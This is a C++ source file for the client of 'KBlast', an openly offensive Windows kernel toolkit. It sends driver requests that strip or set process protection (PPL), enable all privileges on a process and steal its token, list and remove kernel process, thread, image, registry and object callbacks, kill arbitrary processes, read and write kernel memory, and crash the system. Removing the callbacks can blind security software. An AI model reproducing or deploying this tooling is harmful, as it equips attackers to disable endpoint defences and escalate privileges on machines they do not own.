/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlast.exe ( client )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "Kblast_device.hpp"


KBL_COMMAND KblModuleProtection[] = {
	{L"wintcb (/type) ",			L"Enable PPL full(wintcb)"},
	{L"lsa (/type) ",			L"Enable PPL light(lsa)"},
	{L"antimalware (/type) ",	L"Enable PPL light(antimalware)"},
	{L"none (/type) ",			L"Disable PPL"}
};

KBL_COMMAND KblModuleToken[] = {
	{L"enablepriv (/action)",		L"Enable all privileges for a given process"},
	{L"disablepriv (/action)",		L"Disable all privileges for a given process"},
	{L"steal (/action)",			L"Steal token and give it to a given process"},
	{L"restore (/action)",			L"Restore the original token of a given process"}
};

KBL_COMMAND KblModuleCallback[] = {
	{L"process (/type)",	L"Process creation kernel callbacks"},
	{L"thread (/type)",		L"Thread creation kernel callbacks"},
	{L"image (/type)",		L"Image loading kernel callbacks"},
	{L"registry (/type)",	L"Registry kernel callbacks"},
	{L"object (/type)",	L"Object kernel callbacks"}
};

KBL_COMMAND KblModuleProcess[] = {
	{L"terminate (/action)",	L"Terminate process"}
};

KBL_COMMAND KblModuleMisc[] = {
	{L"bsod (/action)",		L"Guess what this command does"},
	{L"memory (/action)",	L"Memory Read/Write (unsafe)"}
};

static 
inline 
void Kblast_p_device_Help()
{
	SIZE_T i = 0;

	wprintf(L"\n------------------- Protection\n");

	for (i = 0; i < KBL_COMM_ELEMS(KblModuleProtection); i++) {
		wprintf(L"%30s\t-\t%s\n",
			KblModuleProtection[i].lpCommand,
			KblModuleProtection[i].lpDescription);
	}

	wprintf(L"\n------------------- Token\n");

	for (i = 0; i < KBL_COMM_ELEMS(KblModuleToken); i++) {
		wprintf(L"%30s\t-\t%s\n",
			KblModuleToken[i].lpCommand,
			KblModuleToken[i].lpDescription);
	}

	wprintf(L"\n------------------- Callback\n");

	for (i = 0; i < KBL_COMM_ELEMS(KblModuleCallback); i++) {
		wprintf(L"%30s\t-\t%s\n",
			KblModuleCallback[i].lpCommand,
			KblModuleCallback[i].lpDescription);
	}

	wprintf(L"\n------------------- Process\n");

	for (i = 0; i < KBL_COMM_ELEMS(KblModuleProcess); i++) {
		wprintf(L"%30s\t-\t%s\n",
			KblModuleProcess[i].lpCommand,
			KblModuleProcess[i].lpDescription);
	}

	wprintf(L"\n------------------- Misc\n");

	for (i = 0; i < KBL_COMM_ELEMS(KblModuleMisc); i++) {
		wprintf(L"%30s\t-\t%s\n",
			KblModuleMisc[i].lpCommand,
			KblModuleMisc[i].lpDescription);
	}

	return;
}

static 
inline
BOOL Kblast_p_device_SubmitIoctlRequest(
	_In_ DWORD IoControlCode, 
	_In_opt_ LPVOID lpInputBuffer, 
	_In_opt_ DWORD dwInputBufferLength, 
	_Out_opt_ LPVOID lpOutputBuffer,
	_In_opt_ DWORD dwOutputBufferLength)
{
	DWORD dwBytesReturned = 0;

	if (!g_KblasterDevice ||
		g_KblasterDevice == INVALID_HANDLE_VALUE) {
		SetLastError(ERROR_INVALID_HANDLE_STATE);
		return FALSE;
	}

	return DeviceIoControl(
		g_KblasterDevice, 
		IoControlCode, 
		lpInputBuffer, 
		dwInputBufferLength, 
		lpOutputBuffer, 
		dwOutputBufferLength, 
		&dwBytesReturned, 
		0);
}


BOOL Kblast_device_IoctlMisc(int argc, wchar_t* input)
{
	BOOL status = FALSE;

	KBL_MODULE_COMMANDLINE Arguments = { 0 };
	KBLR_MEMORY_BUFFER MemoryBuffer = { 0 };
	LPVOID pBlob = 0;
	DWORD dwReturnLength = 0;

	DWORD IoControlCode = 0;
	LPVOID pInputBuffer = 0;
	LPVOID pOutputBuffer = 0;
	DWORD dwInputBufferLength = 0;
	DWORD dwOutputBufferLength = 0;


	status = Kblast_string_ParseCommandline(input, &Arguments);
	if (!status) {
		Kblast_p_device_Help();
		goto Exit;
	}

	if (!Arguments.NumberOfArguments ||
		!Arguments.Commandline.Action) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!strcmp(Arguments.Commandline.Action, "bsod")) {
		IoControlCode = KBLASTER_IOCTL_MISC_BUG_CHECK;
	}
	else if (!strcmp(Arguments.Commandline.Action, "memory")) {
		if (!Arguments.Commandline.Type) {
			SetLastError(ERROR_INVALID_PARAMETER);
			goto Exit;
		}

		if (!strcmp(Arguments.Commandline.Type, "read")) {
			if (!Arguments.Commandline.size ||
				!Arguments.Commandline.Value) {
				SetLastError(ERROR_INVALID_PARAMETER);
				goto Exit;
			}
			MemoryBuffer.Operation = IoReadAccess;
			MemoryBuffer.size = (ULONG)Arguments.Commandline.size;
			MemoryBuffer.ptr = Arguments.Commandline.Value;
		}
		else if (!strcmp(Arguments.Commandline.Type, "write")) {
			if (!Arguments.Commandline.blob ||
				!Arguments.Commandline.Value) {
				SetLastError(ERROR_INVALID_PARAMETER);
				goto Exit;
			}
			MemoryBuffer.Operation = IoWriteAccess;
			MemoryBuffer.ptr = Arguments.Commandline.Value;
			if (!Kblast_string_ConvertStringToHexBlob(Arguments.Commandline.blob, MemoryBuffer.buffer, &dwReturnLength)) {
				goto Exit;
			}
			MemoryBuffer.size = dwReturnLength;
			PRINT_INFO(L"Content parsed:\n");
			Kblast_string_HexDump(MemoryBuffer.buffer, MemoryBuffer.size);
		}

		IoControlCode = KBLASTER_IOCTL_MISC_MEMORY;
		pInputBuffer = &MemoryBuffer;
		pOutputBuffer = &MemoryBuffer;
		dwInputBufferLength = dwOutputBufferLength = sizeof(MemoryBuffer);
	}

	status = Kblast_p_device_SubmitIoctlRequest(
		IoControlCode,
		pInputBuffer,
		dwInputBufferLength,
		pOutputBuffer,
		dwOutputBufferLength
	);

	if (status) {
		if (MemoryBuffer.Operation == IoReadAccess) {
			PRINT_SUCC(L"Request ok. Dumping memory:\n");
			Kblast_string_HexDump(MemoryBuffer.buffer, MemoryBuffer.size);
		}
		else {
			PRINT_SUCC(L"Request ok.");
		}
	}
	else {
		PRINT_ERR_FULL(L"Request returned 0");
	}

	
Exit:

	return status;
}


BOOL Kblast_device_IoctlProcess(int argc, wchar_t* input)
{
	BOOL status = FALSE;

	KBL_MODULE_COMMANDLINE Arguments = { 0 };
	KBLR_TERM_REQUEST TerminationRequest = { 0 };


	status = Kblast_string_ParseCommandline(input, &Arguments);
	if (!status) {
		Kblast_p_device_Help();
		goto Exit;
	}

	if (!Arguments.NumberOfArguments) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!Arguments.Commandline.Action ||
		!Arguments.Commandline.ProcessId) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!strcmp(Arguments.Commandline.Action, "terminate")) {
		if (!Arguments.Commandline.ProcessId) {
			SetLastError(ERROR_INVALID_PARAMETER);
			goto Exit;
		}
		TerminationRequest.processId = Arguments.Commandline.ProcessId;
		status = Kblast_p_device_SubmitIoctlRequest(
			KBLASTER_IOCTL_PROCESS_TERMINATE,
			&TerminationRequest,
			sizeof(KBLR_TERM_REQUEST),
			NULL,
			0
		);
		if (status) {
			PRINT_SUCC(L"Request returned 1");
		}
		else {
			PRINT_ERR_FULL(L"Request returned 0");
		}
	}
	/*
	else if (!strcmp(Arguments.Commandline.Action, "list")) {

	}
	*/

Exit:

	return status;
}


BOOL Kblast_device_IoctlProtection(int argc, wchar_t* input)
{
	BOOL status = FALSE;

	KBL_MODULE_COMMANDLINE Arguments = { 0 };
	KBLR_PROTECTION ProtectionRequest = { 0 };


	status = Kblast_string_ParseCommandline(input, &Arguments);
	if (!status) {
		Kblast_p_device_Help();
		goto Exit;
	}

	if (!Arguments.NumberOfArguments) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!Arguments.Commandline.Type || 
		!Arguments.Commandline.ProcessId) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!strcmp(Arguments.Commandline.Type, "wintcb")) {
		ProtectionRequest.Protection = ProtectionWintcb;
	}
	else if (!strcmp(Arguments.Commandline.Type, "lsa")) {
		ProtectionRequest.Protection = ProtectionLsa;
	}
	else if (!strcmp(Arguments.Commandline.Type, "antimalware")) {
		ProtectionRequest.Protection = ProtectionAntimalware;
	}
	else if (!strcmp(Arguments.Commandline.Type, "none")) {
		ProtectionRequest.Protection = ProtectionNone;
	}
	else {
		goto Exit;
	}

	ProtectionRequest.processId = Arguments.Commandline.ProcessId;

	status = Kblast_p_device_SubmitIoctlRequest(
		KBLASTER_IOCTL_PROTECTION,
		&ProtectionRequest,
		sizeof(KBLR_PROTECTION),
		NULL,
		0
	);

	if (status) {
		PRINT_SUCC(L"Request returned 1");
	}
	else {
		PRINT_ERR_FULL(L"Request returned 0");
	}

Exit:

	return status;
}



BOOL Kblast_device_IoctlToken(int argc, wchar_t* input)
{
	BOOL status = FALSE;

	KBL_MODULE_COMMANDLINE Arguments = { 0 };
	KBLR_TOKEN_PRIV TokenPrivilegesRequest = { 0 };
	KLBR_TOKEN TokenContext = { 0 };

	DWORD IoControlCode = 0;
	LPVOID InputBuffer = 0;
	DWORD InputLength = 0;


	status = Kblast_string_ParseCommandline(input, &Arguments);
	if (!status) {
		Kblast_p_device_Help();
		goto Exit;
	}

	if (!Arguments.NumberOfArguments) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!Arguments.Commandline.Action ||
		!Arguments.Commandline.Type ||
		!Arguments.Commandline.ProcessId) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!strcmp(Arguments.Commandline.Type, "privileges")) {
		IoControlCode = KBLASTER_IOCTL_TOKEN_PRIVILEGES;
		
		if (!strcmp(Arguments.Commandline.Action, "enablepriv")) {
			TokenPrivilegesRequest.IsEnable = TRUE;
		}
		else if (!strcmp(Arguments.Commandline.Action, "disable")) {
			TokenPrivilegesRequest.IsEnable = FALSE;
		}
		else {
			SetLastError(ERROR_INVALID_PARAMETER);
			goto Exit;
		}

		TokenPrivilegesRequest.processId = Arguments.Commandline.ProcessId;
		InputBuffer = &TokenPrivilegesRequest;
		InputLength = sizeof(KBLR_TOKEN_PRIV);
	}
	else if (!strcmp(Arguments.Commandline.Type, "context")) {
		IoControlCode = KBLASTER_IOCTL_TOKEN_CONTEXT;

		if (!strcmp(Arguments.Commandline.Action, "steal")) {
			TokenContext.IsSteal = TRUE;
		}
		else if (!strcmp(Arguments.Commandline.Action, "restore")) {
			TokenContext.IsSteal = FALSE;
		}
		else {
			SetLastError(ERROR_INVALID_PARAMETER);
			goto Exit;
		}

		if (!Arguments.Commandline.TargetProcessId) {
			TokenContext.targetProcessId = 0;
		}
		else {
			TokenContext.targetProcessId = Arguments.Commandline.TargetProcessId;
		}

		TokenContext.processId = Arguments.Commandline.ProcessId;
		InputBuffer = &TokenContext;
		InputLength = sizeof(KLBR_TOKEN);
	}
	else {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	status = Kblast_p_device_SubmitIoctlRequest(
		IoControlCode,
		InputBuffer,
		InputLength,
		NULL,
		0
	);

	if (status) {
		PRINT_SUCC(L"Request returned 1");
	}
	else {
		PRINT_ERR_FULL(L"Request returned 0");
	}


Exit:

	return status;
}


BOOL Kblast_device_IoctlCallback(int argc, wchar_t* input)
{
	BOOL status = FALSE;

	KBL_MODULE_COMMANDLINE Arguments = { 0 };
	
	KBLR_CALLBACK_OPERATION CallbackRequest = { ProcessNotify, 0 };
	PKBLR_NOTIFY_ROUTINE_ARRAY_INFORMATION pRoutineInformation = 0;

	DWORD IoControlCode = 0;
	SIZE_T szOutputBuffer = 0;
	DWORD i = 0;

	char PsProcessType[] = "Process";
	char PsThreadType[] = "Thread";
	char ExDesktopObjectType[] = "Desktop";
	char OpCreate[] = "Create";
	char OpDuplicate[] = "Duplicate";
	char OpBoth[] = "Create | Duplicate";
	char Undefined[] = "Undefined";
	PCSTR ObjectType = 0;
	PCSTR Operation = 0;
	PCSTR FirstModuleName = 0;
	PCSTR SecondModuleName = 0;
	ULONG64 FirstModuleOffset = 0;
	ULONG64 SecondModuleOffset = 0;
	PVOID pCallbackEntry = 0;
	PVOID PreOperation = 0;
	PVOID PostOperation = 0;
	BOOL Enabled = FALSE;


	status = Kblast_string_ParseCommandline(input, &Arguments);
	if (!status) {
		Kblast_p_device_Help();
		goto Exit;
	}

	if (!Arguments.NumberOfArguments) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!Arguments.Commandline.Action ||
		!Arguments.Commandline.Type) {
		SetLastError(ERROR_INVALID_PARAMETER);
		goto Exit;
	}

	if (!strcmp(Arguments.Commandline.Action, "list")) {
		IoControlCode = KBLASTER_IOCTL_CALLBACK_ENUM;
		Arguments.Commandline.Value = 0;
		szOutputBuffer = 0x5000;

		pRoutineInformation = static_cast<PKBLR_NOTIFY_ROUTINE_ARRAY_INFORMATION>(VirtualAlloc(NULL, szOutputBuffer, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
		if (!pRoutineInformation) {
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			goto Exit;
		}
	}
	else if (!strcmp(Arguments.Commandline.Action, "remove")) {
		if (!Arguments.Commandline.Value) {
			SetLastError(ERROR_INVALID_PARAMETER);
			goto Exit;
		}
		IoControlCode = KBLASTER_IOCTL_CALLBACK_REMOVE;
	}

	if (!strcmp(Arguments.Commandline.Type, "process")) {
		CallbackRequest.CallbackType = ProcessNotify;
	}
	else if (!strcmp(Arguments.Commandline.Type, "thread")) {
		CallbackRequest.CallbackType = ThreadNotify;
	}
	else if (!strcmp(Arguments.Commandline.Type, "image")) {
		CallbackRequest.CallbackType = ImageNotify;
	}
	else if (!strcmp(Arguments.Commandline.Type, "registry")) {
		CallbackRequest.CallbackType = RegistryCallback;
	}
	else if (!strcmp(Arguments.Commandline.Type, "object")) {
		CallbackRequest.CallbackType = ObjectCallbacks;
	}
	else if (!strcmp(Arguments.Commandline.Type, "filter")) {
		CallbackRequest.CallbackType = FilterCallback;
	}
	else if (!strcmp(Arguments.Commandline.Type, "network")) {
		CallbackRequest.CallbackType = NetworkCallback;
	}
	else {
		goto Exit;
	}

	if (IoControlCode == KBLASTER_IOCTL_CALLBACK_REMOVE) {
		if (
			(CallbackRequest.CallbackType == ProcessNotify) ||
			(CallbackRequest.CallbackType == ThreadNotify) ||
			(CallbackRequest.CallbackType == ImageNotify)
			) {
			CallbackRequest.NotifyRoutine.RoutineIdentifier = (ULONG_PTR)Arguments.Commandline.Value;
		}
		else if (CallbackRequest.CallbackType == RegistryCallback) {
			CallbackRequest.RegistryCallback.Cookie.QuadPart = (LONGLONG)Arguments.Commandline.Value;
		}
		else if (CallbackRequest.CallbackType == ObjectCallbacks) {
			CallbackRequest.ObjectCallback.CallbackEntry = Arguments.Commandline.Value;
		}
	}
	
	status = Kblast_p_device_SubmitIoctlRequest(
		IoControlCode,
		&CallbackRequest,
		sizeof(KBLR_CALLBACK_OPERATION),
		pRoutineInformation,
		(DWORD)szOutputBuffer
	);

	if (!status) {
		PRINT_ERR_FULL(L"Callback operation failed.");
		goto Exit;
	}

	if (IoControlCode == KBLASTER_IOCTL_CALLBACK_ENUM) {
		if (!strcmp(Arguments.Commandline.Type, "process") ||
			!strcmp(Arguments.Commandline.Type, "thread") ||
			(!strcmp(Arguments.Commandline.Type, "image"))) {
			for (i = 0; i < pRoutineInformation->NumberOfRoutines; i++) {
				printf("[+] 0x%I64x\t--> 0x%-016p\t- %s\t+ 0x%I64x\n",
					pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.NotifyRoutine.Handle,
					pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.NotifyRoutine.Routine,
					Kblast_string_GetImageNameByFullPath(pRoutineInformation->RoutineInformation[i].FirstModuleInformation.ModuleFullPathName),
					(ULONG64)(ULONG_PTR)Sub2Ptr(pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.NotifyRoutine.Routine, pRoutineInformation->RoutineInformation[i].FirstModuleInformation.ModuleBase)
				);
			}
		}
		else if (!strcmp(Arguments.Commandline.Type, "registry")) {
			for (i = 0; i < pRoutineInformation->NumberOfRoutines; i++) {
				printf("[+] 0x%I64x\t--> 0x%-016p\t- %s\t+ 0x%I64x\n",
					pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.RegistryCallback.Cookie.QuadPart,
					pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.RegistryCallback.Routine,
					Kblast_string_GetImageNameByFullPath(pRoutineInformation->RoutineInformation[i].FirstModuleInformation.ModuleFullPathName),
					(ULONG64)(ULONG_PTR)Sub2Ptr(pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.RegistryCallback.Routine, pRoutineInformation->RoutineInformation[i].FirstModuleInformation.ModuleBase)
				);
			}
		}
		else if (!strcmp(Arguments.Commandline.Type, "object")) {
			for (i = 0; i < pRoutineInformation->NumberOfRoutines; i++) {
				switch (pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.ObjectCallback.Type)
				{
				case ProcessType:
					ObjectType = PsProcessType;
					break;
				case ThreadType:
					ObjectType = PsThreadType;
					break;
				case DesktopType:
					ObjectType = ExDesktopObjectType;
					break;
				default:
					ObjectType = Undefined;
					break;
				}

				switch (pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.ObjectCallback.Operation)
				{
				case 1:
					Operation = OpCreate;
					break;
				case 2:
					Operation = OpDuplicate;
					break;
				case 3:
					Operation = OpBoth;
					break;
				default:
					Operation = Undefined;
					break;
				}

				pCallbackEntry = pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.ObjectCallback.CallbackEntry;
				Enabled = pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.ObjectCallback.Enabled;
				PreOperation = pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.ObjectCallback.PreOperation;
				PostOperation = pRoutineInformation->RoutineInformation[i].SpecificRoutineInformation.ObjectCallback.PostOperation;
				if (pRoutineInformation->RoutineInformation[i].FirstModuleInformation.ModuleBase) {
					FirstModuleName = Kblast_string_GetImageNameByFullPath(pRoutineInformation->RoutineInformation[i].FirstModuleInformation.ModuleFullPathName);
					FirstModuleOffset = (ULONG64)(ULONG_PTR)Sub2Ptr(PreOperation, pRoutineInformation->RoutineInformation[i].FirstModuleInformation.ModuleBase);
				}
				else {
					FirstModuleName = "";
				}
				if (pRoutineInformation->RoutineInformation[i].SecondModuleInformation.ModuleBase) {
					SecondModuleName = Kblast_string_GetImageNameByFullPath(pRoutineInformation->RoutineInformation[i].SecondModuleInformation.ModuleFullPathName);
					SecondModuleOffset = (ULONG64)(ULONG_PTR)Sub2Ptr(PostOperation, pRoutineInformation->RoutineInformation[i].SecondModuleInformation.ModuleBase);
				}
				else {
					SecondModuleName = "";
				}
				
				printf(
					"[+] Entry: 0x%-016p\n\t\t"
					"* Type\t\t: %s\n\t\t"
					"* Enabled\t: %d\n\t\t"
					"* Operation\t: %s\n\t\t"
					"* PreOperation\t: 0x%-016p\t - %s\t+ 0x%I64x\n\t\t"
					"* PostOperation\t: 0x%-016p\t - %s\t+ 0x%I64x\n",
					pCallbackEntry,
					ObjectType,
					Enabled,
					Operation,
					PreOperation,
					FirstModuleName,
					FirstModuleOffset,
					PostOperation,
					SecondModuleName,
					SecondModuleOffset
				);

				pCallbackEntry = 0;
				Enabled = 0;
				Operation = 0;
				PreOperation = 0;
				PostOperation = 0;
				FirstModuleName = 0;
				FirstModuleOffset = 0;
				SecondModuleName = 0;
				SecondModuleOffset = 0;

			}
		}
	}
	else if (IoControlCode == KBLASTER_IOCTL_CALLBACK_REMOVE) {
		if (status && GetLastError() == ERROR_SUCCESS) {
			PRINT_SUCC(L"Routine succefully removed");
		}
		else {
			PRINT_ERR_FULL(L"Routine could not be removed");
		}
	}


Exit:
	if (pRoutineInformation) {
		VirtualFree(pRoutineInformation, 0, MEM_RELEASE);
	}

	return status;
}
